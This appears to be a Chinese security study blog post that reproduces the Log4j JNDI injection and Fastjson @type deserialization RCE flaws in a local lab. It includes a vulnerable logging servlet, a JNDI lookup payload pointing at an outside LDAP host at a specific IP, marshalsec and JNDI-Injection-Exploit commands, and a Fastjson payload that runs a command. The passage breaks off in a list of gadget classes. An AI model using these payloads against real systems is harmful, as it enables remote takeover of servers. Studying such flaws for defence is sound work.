<p><img src="/img/xiaodi/image-20250521202419170.png" alt="image-20250521202419170"></p>
<h4 id="2-RCE漏洞简介"><a href="#2-RCE漏洞简介" class="headerlink" title="2.RCE漏洞简介"></a>2.RCE漏洞简介</h4><p>RCE (Remote Code Execution) 漏洞是一种计算机安全漏洞，它允许攻击者远程执行恶意代码或命令，从而获取对目标系统的控制权。攻击者可以通过利用软件或系统中存在的安全漏洞，将恶意代码注入到目标系统中，然后执行它们。</p>
<p>RCE 漏洞可能会导致严重的安全问题，攻击者可以利用这些漏洞进行各种恶意活动，包括但不限于以下几点：</p>
<p>控制系统：攻击者可以通过远程执行代码来获得对目标系统的完全控制。这使得攻击者可以访问系统上的敏感数据、修改配置、操纵系统行为等。<br>系统破坏：攻击者可能会利用 RCE 漏洞来破坏系统的正常运行。他们可以执行破坏性的命令，例如删除文件、关闭关键服务或引发系统崩溃。<br>数据泄露：攻击者可以利用 RCE 漏洞来访问系统上的敏感数据，例如个人身份信息、登录凭据、银行信息等。这些数据可能被窃取、滥用或出售。</p>
<h1 id="JavaEE应用-第三方组件-Log4j日志-FastJson序列化-JNDI注入"><a href="#JavaEE应用-第三方组件-Log4j日志-FastJson序列化-JNDI注入" class="headerlink" title="JavaEE应用&amp;第三方组件&amp;Log4j日志&amp;FastJson序列化&amp;JNDI注入"></a>JavaEE应用&amp;第三方组件&amp;Log4j日志&amp;FastJson序列化&amp;JNDI注入</h1><h2 id="Java-项目管理工具-配置"><a href="#Java-项目管理工具-配置" class="headerlink" title="Java-项目管理工具-配置"></a>Java-<strong>项目管理工具-配置</strong></h2><p>Jar仓库：</p>
<p><a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a></p>
<p>Maven配置：</p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/259780.htm">https://www.jb51.net/article/259780.htm</a></p>
<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p><img src="/img/xiaodi/9d3ef1a3c0e60b55beb0fa31373a50c6.png" alt="Untitled"></p>
<h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>1、JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。用于在分布式环境中查找和访问命名和目录服务。它允许Java应用程序通过名称引用资源，如数据库连接、远程对象等。</p>
<p>2、反序列化常用的两种利用方式，一种是基于RMI，一种是基于ldap。</p>
<p>3、RMI是一种行为，指的是Java远程方法调用。通过 RMI，对象的方法可以在远程 JVM 上被调用。</p>
<p>4、LDAP指轻量级目录服务协议。LDAP 主要用于访问目录服务，这是一种树形结构的数据库，用于组织和存储信息。</p>
<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p><strong>原理：利用JNDI的apl接口如RMI或LDAP远程调用自己所写的危险代码实现注入</strong></p>
<p><img src="/img/xiaodi/1be7dead8f6708804c7245f68c9ec0b8.png" alt="Untitled"></p>
<p>Java Naming and Directory Interface (Java 命名和目录接口 )，JNDI 提供统一的客户端 API，通过不同的服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录服务，使得 JAVA 应用程可以通过 JNDI 实现和这些命名服务和目录服务之间的交互。</p>
<p><strong>危害</strong></p>
<p><strong>1、Log4j 2.x</strong> </p>
<p>Log4j 2.x中的 JNDI 注入漏洞LDAP，允许攻击者通过特制的日志消息进行远程代码执行。在这种情况下，攻击者可以利用恶意构造的 JNDI上下文注入，执行恶意的Java代码。</p>
<p>​	上下文注入：<br>​		在某些情况下，应用程序会通过用户提供的数据构建 JNDI 上下文（InitialContext）。<br>​		如果应用程序在构建上下文时没有充分验证和过滤用户提供的数据，攻击者可能会尝试通</p>
<p>2、<strong>FastJson JNDI 注入漏洞（JSON ）</strong></p>
<blockquote>
<p>1、FastJson 在解析 JSON 数据时，会将 JSON 字符串转换为 Java 对象。</p>
<p>2、攻击者可以通过构造恶意的 JSON 字符串，包含特殊的 JSON 注释和 FastJson 的特性，来触发漏洞。<br>    攻击者构造的 JSON 数据可能包含特殊的注释和 FastJson 的特性，以触发漏洞并执行恶意代码。</p>
<p>3、远程代码执行：<br>由于漏洞存在，攻击者可能成功执行远程代码，导致服务器上的不安全操作。</p>
</blockquote>
<h2 id="三方组件-Log4J-JNDI"><a href="#三方组件-Log4J-JNDI" class="headerlink" title="三方组件-Log4J&amp;JNDI"></a>三方组件-Log4J&amp;JNDI</h2><h3 id="Log4J"><a href="#Log4J" class="headerlink" title="Log4J"></a>Log4J</h3><p>Log4J：日志管理<br>    Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p>
<h3 id="Log4j-组件安全复现"><a href="#Log4j-组件安全复现" class="headerlink" title="Log4j-组件安全复现"></a>Log4j-组件安全复现</h3><p><strong>本地简单实现</strong></p>
<ul>
<li>创建Maven并命名为Log4jDemo</li>
<li>找到对应版本**<a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core">Apache Log4j Core</a> » <a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.14.1">2.14.1</a>，并导入至项目中pomxml文件中**</li>
<li>并刷新Maven则导入成功</li>
<li>在java下创建<code>Log4jTest.java</code> 文件,导入引入的第三方Log4j相关包<ul>
<li><strong>Log4j 使用：</strong> 代码使用 Log4j 2.x 提供的日志功能，通过 <strong><code>LogManager.getLogger</code></strong> 获取一个 Logger 实例，<strong>然后使用 <code>Logger.error</code> 记录错误日志。</strong></li>
<li>在 Logger.error(“{}”, code); 中，code 的值是 ${java:os}。这是 Log4j 的变量替换语法，其中 ${java:os} 表示执行 Java 系统属性（在这里是执行系统命令）。如果 code 的值是由用户提供的，那么存在潜在的安全风险，因为用户可以通过输入特定的内容来执行恶意代码。</li>
</ul>
</li>
</ul>
<h4 id="1、Maven引用Log4j"><a href="#1、Maven引用Log4j" class="headerlink" title="1、Maven引用Log4j"></a>1、Maven引用Log4j</h4><p>依赖下载：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https:<span class="comment">//mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">2.14</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">            </span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>



<p><img src="/img/xiaodi/image-20250522084222085.png" alt="image-20250522084222085"></p>
<p>Log4jTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LogManager.getLogger(Log4jTest.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;$&#123;java:os&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        log.error(<span class="string">&quot;&#123;&#125;&quot;</span>,code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>效果实现：</p>
<p><img src="/img/xiaodi/image-20250522084150914-1747874512296-1.png" alt="image-20250522084150914"></p>
<h4 id="2、接受用户输入值"><a href="#2、接受用户输入值" class="headerlink" title="2、接受用户输入值"></a>2、接受用户输入值</h4><p>创建JavaEE项目，使用Tomcat 9.0.74进行创建</p>
<p>Log4jServlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.log4jeedemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@WebServlet(&quot;/log4j&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">Logger</span> <span class="operator">=</span> LogManager.getLogger(Log4jServlet.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span>&#123;</span><br><span class="line">        <span class="comment">// 从请求中获取名为 &quot;code&quot; 的参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录日志，潜在的安全风险：直接使用用户输入</span></span><br><span class="line">        Logger.error(<span class="string">&quot;&#123;&#125;&quot;</span>, code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<blockquote>
<p>遇到的问题：</p>
<p><strong>遇到问题</strong>：HTTP Status <strong>400</strong> – 错误的请求描述 由于被认为是客户端对错误（例如：<strong>畸形的请求语法</strong>、无效的请求信息帧或者虚拟的请求路由），服务器无法或不会处理当前请求</p>
<p><img src="/img/xiaodi/image-20250522085229361.png" alt="image-20250522085229361"></p>
<p>原因：<br>是tomcat的版本问题,好像是tomcat7.9以上的版本,都不支持请求链接上带有特殊字符.否则会报400错误,<br>这是因为Tomcat严格按照 RFC 3986规范进行访问解析，而 RFC3986规范定义了Url中只允许包含英文字母（a-zA-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符(RFC3986中指定了以下字符为保留字符：! * ’ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ])。传入的参数中有”{“不在RFC3986中的保留字段中，所以会报这个错。</p>
<p>解决方式：修改Tomcat<strong>配置server.xml</strong></p>
<p>Tomcat-9\apache-tomcat-9.0.74\conf\server.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8080&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;HTTP/1.1&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">relaxedQueryChars</span>=<span class="string">&quot;[]|&#123;&#125;^<span class="symbol">&amp;#x5c;</span><span class="symbol">&amp;#x60;</span><span class="symbol">&amp;quot;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span>&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">connectionTimeout</span>=<span class="string">&quot;20000&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">redirectPort</span>=<span class="string">&quot;8443&quot;</span> /</span></span><br><span class="line"><span class="tag"></span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>进行访问</p>
<p><img src="/img/xiaodi/image-20250522085951746.png" alt="image-20250522085951746"></p>
<p><img src="/img/xiaodi/image-20250522090018219.png" alt="image-20250522090018219"></p>
<h4 id="3、利用jndi-ldap执行"><a href="#3、利用jndi-ldap执行" class="headerlink" title="3、利用jndi-ldap执行"></a>3、利用jndi-ldap执行</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code=$(java:os) 输出执行结果：显示系统</span><br><span class="line">code=(java:os) 正常输入正常输出：(java:os)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://47.94.236.117:1389/uyhyw6&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;jndi:ldap://xxxx.dns.log&#125;</span></span><br><span class="line">ldap://47.94.236.117:1389/uyhyw6 生成的远程可访问的调用方法</span><br><span class="line">什么方法？ -A “calc” 执行计算机的功能方法（JNDI注入工具生成的）</span><br></pre></td></tr></table></figure>



<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ory001/article/details/121879748">Apache Log4j2 - JNDI RCE漏洞攻击保姆级教程（仅供测试请勿攻击他人）_apcjnd-CSDN博客</a></p>
<h5 id="marshalsec使用"><a href="#marshalsec使用" class="headerlink" title="marshalsec使用"></a>marshalsec使用</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/107942941">java 反序列化利用工具 marshalsec 使用简介-CSDN博客</a></p>
<p>开启RMI服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/#ExportObject 1099</span><br></pre></td></tr></table></figure>

<p>开启LDAP服务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/#ExportObject 1389</span><br></pre></td></tr></table></figure>



<h5 id="JNDI-Injection-Exploit"><a href="#JNDI-Injection-Exploit" class="headerlink" title="JNDI-Injection-Exploit"></a>JNDI-Injection-Exploit</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gitblog_01056/article/details/141008452">JNDI-Injection-Exploit 使用教程-CSDN博客</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br></pre></td></tr></table></figure>



<h2 id="三方组件-FastJson-反射"><a href="#三方组件-FastJson-反射" class="headerlink" title="三方组件-FastJson&amp;反射"></a>三方组件-FastJson&amp;反射</h2><p><strong>FastJson：可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</strong></p>
<p>在前后端数据传输交互中,经常会遇到字符串(String)与json,XML等格式相互转换与解析，其中json以跨语言，跨前后端的优点在开发中被频繁使用，基本上是标准的数据交换格式。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web输出等各种应用场景中。FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。</p>
<h3 id="Fastjson-组件安全复现"><a href="#Fastjson-组件安全复现" class="headerlink" title="Fastjson-组件安全复现"></a>Fastjson-组件安全复现</h3><h4 id="1、Maven引用Fastjson"><a href="#1、Maven引用Fastjson" class="headerlink" title="1、Maven引用Fastjson"></a>1、Maven引用Fastjson</h4><p><img src="/img/xiaodi/a441e8ddca4ffff16eae80d4350d3665.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/a4e8947d9e81fe796565fece36704276.png" alt="Untitled"></p>
<h4 id="2、创建需转换类对象User"><a href="#2、创建需转换类对象User" class="headerlink" title="2、创建需转换类对象User"></a>2、创建需转换类对象User</h4><p>编写User测试类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(age);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>  String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>创建FastjsonDemo.java进行测试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class FastjsonDemo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User u = new User();</span><br><span class="line">        u.setAge(30);</span><br><span class="line">        u.setName(&quot;xiaodi&quot;);</span><br><span class="line">        System.out.println(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250522093843072.png" alt="image-20250522093843072"></p>
<h4 id="3、使用Fastjson进行数据转换（对象转Json）"><a href="#3、使用Fastjson进行数据转换（对象转Json）" class="headerlink" title="3、使用Fastjson进行数据转换（对象转Json）"></a>3、使用Fastjson进行数据转换（对象转Json）</h4><ul>
<li>对象 -&gt; JSON<ul>
<li>选择Fastjson，更加方便的将对象转换为JSON格式的数据</li>
</ul>
</li>
</ul>
<p>FastjsonDemo.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//u Object对象</span></span><br><span class="line">        <span class="comment">//Integer age String name 字符串数据</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        u.setAge(<span class="number">30</span>);</span><br><span class="line">        u.setName(<span class="string">&quot;xiaodi&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(u);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//上述对象 -&gt; JSON</span></span><br><span class="line">        <span class="comment">//我们想把数据转换成Json格式数据，我不想用自带的API（太麻烦）</span></span><br><span class="line">        <span class="comment">//我就选择第三方组件fastjson来去做这个功能</span></span><br><span class="line">        <span class="comment">//讲json对象转换json数据</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> JSONObject.toJSONString(u);</span><br><span class="line">        System.out.println(jsonStr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250522094211582.png" alt="image-20250522094211582"></p>
<h4 id="4、数据转换-Json转对象"><a href="#4、数据转换-Json转对象" class="headerlink" title="4、数据转换(Json转对象)"></a>4、数据转换(Json转对象)</h4><p>JSON -&gt; 对象</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分析漏洞利用 多输出 转换数据的类型（类） 告诉大家其实前面有一个@type 转换对象类包</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString1</span> <span class="operator">=</span> JSONObject.toJSONString(u, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonString1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250522094918317.png" alt="image-20250522094918317"></p>
<p>将JSON转换为对象后，出现了@type转换对象类包</p>
<p>通过修改@type的value既可以实现代码执行</p>
<p>在本地创建一个Run.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Run</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>修改Fastjson.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:30,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">test1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Run\&quot;,\&quot;age\&quot;:30,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(test);</span><br><span class="line">        System.out.println(<span class="string">&quot;这就是json转换为对象的格式：&quot;</span>+jsonObject);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span> JSON.parseObject(test1);</span><br><span class="line">        System.out.println(<span class="string">&quot;这就是json转换为对象的格式：&quot;</span>+jsonObject1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><img src="/img/xiaodi/image-20250522095357430.png" alt="image-20250522095357430"></p>
<p>但在实际渗透过程中，并不知道是否存在RCE相关的执行代码，所以这种调用方式，几乎是无法使用的</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/guo15890025019/article/details/120532891">Fastjson漏洞分析与利用详解-CSDN博客</a>后续参考文章</p>
<h2 id="JavaEE应用-JNDI注入-RMI服务-LDAP服务-JDK绕过-调用链类"><a href="#JavaEE应用-JNDI注入-RMI服务-LDAP服务-JDK绕过-调用链类" class="headerlink" title="JavaEE应用&amp;JNDI注入&amp;RMI服务&amp;LDAP服务&amp;JDK绕过&amp;调用链类"></a>JavaEE应用&amp;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=JNDI&spm=1001.2101.3001.7020">JNDI</a>注入&amp;RMI服务&amp;LDAP服务&amp;JDK绕过&amp;调用链类</h2><p><img src="/img/xiaodi/9d3ef1a3c0e60b55beb0fa31373a50c6-1747918719352-1.png" alt="Untitled"></p>
<p>JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。<br>RMI：远程方法调用注册表<br>LDAP：轻量级目录访问协议</p>
<p>调用检索：<br>Java为了将Object对象存储在<strong>Naming或Directory服务</strong>下，提供了<strong>Naming Reference功能</strong>，对象可以通过绑定<strong>Reference存储在Naming或Directory服务</strong>下，比如RMI、LDAP等。</p>
<p><strong>在RMI服务中调用了InitialContext.lookup()的类有：</strong></p>
<blockquote>
<p>org.springframework.transaction.jta.JtaTransactionManager.readObject()<br><strong>com.sun.rowset.JdbcRowSetImpl.execute()</strong><br>javax.management.remote.rmi.RMIConnector.connect()<br>org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</p>
</blockquote>
<p><strong>在LDAP服务中调用了InitialContext.lookup()的类有：</strong></p>
